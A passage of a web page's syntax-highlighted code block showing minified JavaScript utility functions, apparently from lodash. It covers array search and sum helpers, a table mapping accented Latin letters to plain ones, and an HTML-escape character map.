class="keyword">return</span> n</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">ge</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">var</span> n = -<span class="number">1</span>, r = <span class="literal">null</span> == t ? <span class="number">0</span> : t.<span class="property">length</span>; ++n &lt; r;)</span><br><span class="line">                                <span class="keyword">if</span> (<span class="title function_">e</span>(t[n], n, t))</span><br><span class="line">                                    <span class="keyword">return</span> !<span class="number">0</span>;</span><br><span class="line">                            <span class="keyword">return</span> !<span class="number">1</span></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">var</span> ye = <span class="title class_">Se</span>(<span class="string">&quot;length&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">be</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                            <span class="keyword">var</span> r;</span><br><span class="line">                            <span class="keyword">return</span> <span class="title function_">n</span>(t, (<span class="keyword">function</span> (<span class="params">t, n, i</span>) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="title function_">e</span>(t, n, i))</span><br><span class="line">                                        <span class="keyword">return</span> r = n,</span><br><span class="line">                                            !<span class="number">1</span></span><br><span class="line">                                &#125;</span><br><span class="line">                            )),</span><br><span class="line">                                r</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">we</span>(<span class="params">t, e, n, r</span>) &#123;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">var</span> i = t.<span class="property">length</span>, o = n + (r ? <span class="number">1</span> : -<span class="number">1</span>); r ? o-- : ++o &lt; i;)</span><br><span class="line">                                <span class="keyword">if</span> (<span class="title function_">e</span>(t[o], o, t))</span><br><span class="line">                                    <span class="keyword">return</span> o;</span><br><span class="line">                            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">_e</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> e == e ? <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> r = n - <span class="number">1</span></span><br><span class="line">                                    , i = t.<span class="property">length</span>;</span><br><span class="line">                                <span class="keyword">for</span> (; ++r &lt; i;)</span><br><span class="line">                                    <span class="keyword">if</span> (t[r] === e)</span><br><span class="line">                                        <span class="keyword">return</span> r;</span><br><span class="line">                                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">                            &#125;(t, e, n) : <span class="title function_">we</span>(t, ze, n)</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">xe</span>(<span class="params">t, e, n, r</span>) &#123;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">var</span> i = n - <span class="number">1</span>, o = t.<span class="property">length</span>; ++i &lt; o;)</span><br><span class="line">                                <span class="keyword">if</span> (<span class="title function_">r</span>(t[i], e))</span><br><span class="line">                                    <span class="keyword">return</span> i;</span><br><span class="line">                            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">ze</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> t != t</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">Me</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                            <span class="keyword">var</span> n = <span class="literal">null</span> == t ? <span class="number">0</span> : t.<span class="property">length</span>;</span><br><span class="line">                            <span class="keyword">return</span> n ? <span class="title class_">Te</span>(t, e) / n : <span class="title class_">NaN</span></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">Se</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">null</span> == e ? <span class="keyword">void</span> <span class="number">0</span> : e[t]</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">Ce</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">null</span> == t ? <span class="keyword">void</span> <span class="number">0</span> : t[e]</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">He</span>(<span class="params">t, e, n, r, i</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="title function_">i</span>(t, (<span class="keyword">function</span> (<span class="params">t, i, o</span>) &#123;</span><br><span class="line">                                    n = r ? (r = !<span class="number">1</span>,</span><br><span class="line">                                        t) : <span class="title function_">e</span>(n, t, i, o)</span><br><span class="line">                                &#125;</span><br><span class="line">                            )),</span><br><span class="line">                                n</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">Te</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">var</span> n, r = -<span class="number">1</span>, i = t.<span class="property">length</span>; ++r &lt; i;) &#123;</span><br><span class="line">                                <span class="keyword">var</span> o = <span class="title function_">e</span>(t[r]);</span><br><span class="line">                                <span class="keyword">void</span> <span class="number">0</span> !== o &amp;&amp; (n = <span class="keyword">void</span> <span class="number">0</span> === n ? o : n + o)</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">return</span> n</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">Ae</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">var</span> n = -<span class="number">1</span>, r = <span class="title class_">Array</span>(t); ++n &lt; t;)</span><br><span class="line">                                r[n] = <span class="title function_">e</span>(n);</span><br><span class="line">                            <span class="keyword">return</span> r</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">Oe</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> t ? t.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="title class_">Xe</span>(t) + <span class="number">1</span>).<span class="title function_">replace</span>(X, <span class="string">&quot;&quot;</span>) : t</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">Ee</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_">t</span>(e)</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">ke</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="title function_">de</span>(e, (<span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> t[e]</span><br><span class="line">                                &#125;</span><br><span class="line">                            ))</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">Le</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> t.<span class="title function_">has</span>(e)</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">Ve</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">var</span> n = -<span class="number">1</span>, r = t.<span class="property">length</span>; ++n &lt; r &amp;&amp; <span class="title function_">_e</span>(e, t[n], <span class="number">0</span>) &gt; -<span class="number">1</span>;)</span><br><span class="line">                                ;</span><br><span class="line">                            <span class="keyword">return</span> n</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">Pe</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">var</span> n = t.<span class="property">length</span>; n-- &amp;&amp; <span class="title function_">_e</span>(e, t[n], <span class="number">0</span>) &gt; -<span class="number">1</span>;)</span><br><span class="line">                                ;</span><br><span class="line">                            <span class="keyword">return</span> n</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">je</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">var</span> n = t.<span class="property">length</span>, r = <span class="number">0</span>; n--;)</span><br><span class="line">                                t[n] === e &amp;&amp; ++r;</span><br><span class="line">                            <span class="keyword">return</span> r</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Fe</span> = <span class="title class_">Ce</span>(&#123;</span><br><span class="line">                            <span class="string">&quot;À&quot;</span>: <span class="string">&quot;A&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Á&quot;</span>: <span class="string">&quot;A&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Â&quot;</span>: <span class="string">&quot;A&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ã&quot;</span>: <span class="string">&quot;A&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ä&quot;</span>: <span class="string">&quot;A&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Å&quot;</span>: <span class="string">&quot;A&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;à&quot;</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;á&quot;</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;â&quot;</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ã&quot;</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ä&quot;</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;å&quot;</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ç&quot;</span>: <span class="string">&quot;C&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ç&quot;</span>: <span class="string">&quot;c&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ð&quot;</span>: <span class="string">&quot;D&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ð&quot;</span>: <span class="string">&quot;d&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;È&quot;</span>: <span class="string">&quot;E&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;É&quot;</span>: <span class="string">&quot;E&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ê&quot;</span>: <span class="string">&quot;E&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ë&quot;</span>: <span class="string">&quot;E&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;è&quot;</span>: <span class="string">&quot;e&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;é&quot;</span>: <span class="string">&quot;e&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ê&quot;</span>: <span class="string">&quot;e&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ë&quot;</span>: <span class="string">&quot;e&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ì&quot;</span>: <span class="string">&quot;I&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Í&quot;</span>: <span class="string">&quot;I&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Î&quot;</span>: <span class="string">&quot;I&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ï&quot;</span>: <span class="string">&quot;I&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ì&quot;</span>: <span class="string">&quot;i&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;í&quot;</span>: <span class="string">&quot;i&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;î&quot;</span>: <span class="string">&quot;i&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ï&quot;</span>: <span class="string">&quot;i&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ñ&quot;</span>: <span class="string">&quot;N&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ñ&quot;</span>: <span class="string">&quot;n&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ò&quot;</span>: <span class="string">&quot;O&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ó&quot;</span>: <span class="string">&quot;O&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ô&quot;</span>: <span class="string">&quot;O&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Õ&quot;</span>: <span class="string">&quot;O&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ö&quot;</span>: <span class="string">&quot;O&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ø&quot;</span>: <span class="string">&quot;O&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ò&quot;</span>: <span class="string">&quot;o&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ó&quot;</span>: <span class="string">&quot;o&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ô&quot;</span>: <span class="string">&quot;o&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;õ&quot;</span>: <span class="string">&quot;o&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ö&quot;</span>: <span class="string">&quot;o&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ø&quot;</span>: <span class="string">&quot;o&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ù&quot;</span>: <span class="string">&quot;U&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ú&quot;</span>: <span class="string">&quot;U&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Û&quot;</span>: <span class="string">&quot;U&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ü&quot;</span>: <span class="string">&quot;U&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ù&quot;</span>: <span class="string">&quot;u&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ú&quot;</span>: <span class="string">&quot;u&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;û&quot;</span>: <span class="string">&quot;u&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ü&quot;</span>: <span class="string">&quot;u&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ý&quot;</span>: <span class="string">&quot;Y&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ý&quot;</span>: <span class="string">&quot;y&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ÿ&quot;</span>: <span class="string">&quot;y&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Æ&quot;</span>: <span class="string">&quot;Ae&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;æ&quot;</span>: <span class="string">&quot;ae&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Þ&quot;</span>: <span class="string">&quot;Th&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;þ&quot;</span>: <span class="string">&quot;th&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ß&quot;</span>: <span class="string">&quot;ss&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ā&quot;</span>: <span class="string">&quot;A&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ă&quot;</span>: <span class="string">&quot;A&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ą&quot;</span>: <span class="string">&quot;A&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ā&quot;</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ă&quot;</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ą&quot;</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ć&quot;</span>: <span class="string">&quot;C&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ĉ&quot;</span>: <span class="string">&quot;C&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ċ&quot;</span>: <span class="string">&quot;C&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Č&quot;</span>: <span class="string">&quot;C&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ć&quot;</span>: <span class="string">&quot;c&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ĉ&quot;</span>: <span class="string">&quot;c&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ċ&quot;</span>: <span class="string">&quot;c&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;č&quot;</span>: <span class="string">&quot;c&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ď&quot;</span>: <span class="string">&quot;D&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Đ&quot;</span>: <span class="string">&quot;D&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ď&quot;</span>: <span class="string">&quot;d&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;đ&quot;</span>: <span class="string">&quot;d&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ē&quot;</span>: <span class="string">&quot;E&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ĕ&quot;</span>: <span class="string">&quot;E&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ė&quot;</span>: <span class="string">&quot;E&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ę&quot;</span>: <span class="string">&quot;E&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ě&quot;</span>: <span class="string">&quot;E&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ē&quot;</span>: <span class="string">&quot;e&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ĕ&quot;</span>: <span class="string">&quot;e&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ė&quot;</span>: <span class="string">&quot;e&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ę&quot;</span>: <span class="string">&quot;e&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ě&quot;</span>: <span class="string">&quot;e&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ĝ&quot;</span>: <span class="string">&quot;G&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ğ&quot;</span>: <span class="string">&quot;G&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ġ&quot;</span>: <span class="string">&quot;G&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ģ&quot;</span>: <span class="string">&quot;G&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ĝ&quot;</span>: <span class="string">&quot;g&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ğ&quot;</span>: <span class="string">&quot;g&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ġ&quot;</span>: <span class="string">&quot;g&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ģ&quot;</span>: <span class="string">&quot;g&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ĥ&quot;</span>: <span class="string">&quot;H&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ħ&quot;</span>: <span class="string">&quot;H&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ĥ&quot;</span>: <span class="string">&quot;h&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ħ&quot;</span>: <span class="string">&quot;h&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ĩ&quot;</span>: <span class="string">&quot;I&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ī&quot;</span>: <span class="string">&quot;I&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ĭ&quot;</span>: <span class="string">&quot;I&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Į&quot;</span>: <span class="string">&quot;I&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;İ&quot;</span>: <span class="string">&quot;I&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ĩ&quot;</span>: <span class="string">&quot;i&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ī&quot;</span>: <span class="string">&quot;i&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ĭ&quot;</span>: <span class="string">&quot;i&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;į&quot;</span>: <span class="string">&quot;i&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ı&quot;</span>: <span class="string">&quot;i&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ĵ&quot;</span>: <span class="string">&quot;J&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ĵ&quot;</span>: <span class="string">&quot;j&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ķ&quot;</span>: <span class="string">&quot;K&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ķ&quot;</span>: <span class="string">&quot;k&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ĸ&quot;</span>: <span class="string">&quot;k&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ĺ&quot;</span>: <span class="string">&quot;L&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ļ&quot;</span>: <span class="string">&quot;L&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ľ&quot;</span>: <span class="string">&quot;L&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ŀ&quot;</span>: <span class="string">&quot;L&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ł&quot;</span>: <span class="string">&quot;L&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ĺ&quot;</span>: <span class="string">&quot;l&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ļ&quot;</span>: <span class="string">&quot;l&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ľ&quot;</span>: <span class="string">&quot;l&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ŀ&quot;</span>: <span class="string">&quot;l&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ł&quot;</span>: <span class="string">&quot;l&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ń&quot;</span>: <span class="string">&quot;N&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ņ&quot;</span>: <span class="string">&quot;N&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ň&quot;</span>: <span class="string">&quot;N&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ŋ&quot;</span>: <span class="string">&quot;N&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ń&quot;</span>: <span class="string">&quot;n&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ņ&quot;</span>: <span class="string">&quot;n&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ň&quot;</span>: <span class="string">&quot;n&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ŋ&quot;</span>: <span class="string">&quot;n&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ō&quot;</span>: <span class="string">&quot;O&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ŏ&quot;</span>: <span class="string">&quot;O&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ő&quot;</span>: <span class="string">&quot;O&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ō&quot;</span>: <span class="string">&quot;o&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ŏ&quot;</span>: <span class="string">&quot;o&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ő&quot;</span>: <span class="string">&quot;o&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ŕ&quot;</span>: <span class="string">&quot;R&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ŗ&quot;</span>: <span class="string">&quot;R&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ř&quot;</span>: <span class="string">&quot;R&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ŕ&quot;</span>: <span class="string">&quot;r&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ŗ&quot;</span>: <span class="string">&quot;r&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ř&quot;</span>: <span class="string">&quot;r&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ś&quot;</span>: <span class="string">&quot;S&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ŝ&quot;</span>: <span class="string">&quot;S&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ş&quot;</span>: <span class="string">&quot;S&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Š&quot;</span>: <span class="string">&quot;S&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ś&quot;</span>: <span class="string">&quot;s&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ŝ&quot;</span>: <span class="string">&quot;s&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ş&quot;</span>: <span class="string">&quot;s&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;š&quot;</span>: <span class="string">&quot;s&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ţ&quot;</span>: <span class="string">&quot;T&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ť&quot;</span>: <span class="string">&quot;T&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ŧ&quot;</span>: <span class="string">&quot;T&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ţ&quot;</span>: <span class="string">&quot;t&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ť&quot;</span>: <span class="string">&quot;t&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ŧ&quot;</span>: <span class="string">&quot;t&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ũ&quot;</span>: <span class="string">&quot;U&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ū&quot;</span>: <span class="string">&quot;U&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ŭ&quot;</span>: <span class="string">&quot;U&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ů&quot;</span>: <span class="string">&quot;U&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ű&quot;</span>: <span class="string">&quot;U&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ų&quot;</span>: <span class="string">&quot;U&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ũ&quot;</span>: <span class="string">&quot;u&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ū&quot;</span>: <span class="string">&quot;u&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ŭ&quot;</span>: <span class="string">&quot;u&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ů&quot;</span>: <span class="string">&quot;u&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ű&quot;</span>: <span class="string">&quot;u&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ų&quot;</span>: <span class="string">&quot;u&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ŵ&quot;</span>: <span class="string">&quot;W&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ŵ&quot;</span>: <span class="string">&quot;w&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ŷ&quot;</span>: <span class="string">&quot;Y&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ŷ&quot;</span>: <span class="string">&quot;y&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ÿ&quot;</span>: <span class="string">&quot;Y&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ź&quot;</span>: <span class="string">&quot;Z&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ż&quot;</span>: <span class="string">&quot;Z&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ž&quot;</span>: <span class="string">&quot;Z&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ź&quot;</span>: <span class="string">&quot;z&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ż&quot;</span>: <span class="string">&quot;z&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ž&quot;</span>: <span class="string">&quot;z&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Ĳ&quot;</span>: <span class="string">&quot;IJ&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ĳ&quot;</span>: <span class="string">&quot;ij&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;Œ&quot;</span>: <span class="string">&quot;Oe&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;œ&quot;</span>: <span class="string">&quot;oe&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ŉ&quot;</span>: <span class="string">&quot;&#x27;n&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;ſ&quot;</span>: <span class="string">&quot;s&quot;</span></span><br><span class="line">                        &#125;)</span><br><span class="line">                            , <span class="title class_">De</span> = <span class="title class_">Ce</span>(&#123;</span><br><span class="line">                            <span class="string">&quot;&amp;&quot;</span>: <span class="string">&quot;&amp;amp;&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;&lt;&quot;</span>: <span class="string">&quot;&amp;lt;&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;&gt;&quot;</span>: <span class="string">&quot;&amp;gt;&quot;</span>,</span><br><span class="line">                            <span class="string">&#x27;&quot;&#x27;</span>: <span class="string">&quot;&amp;quot;&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;&#x27;&quot;</span>: <span class="string">&quot;&amp;#39;&quot;</span></span><br><span class="line">                        &#125;);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">Ne</span>(<span 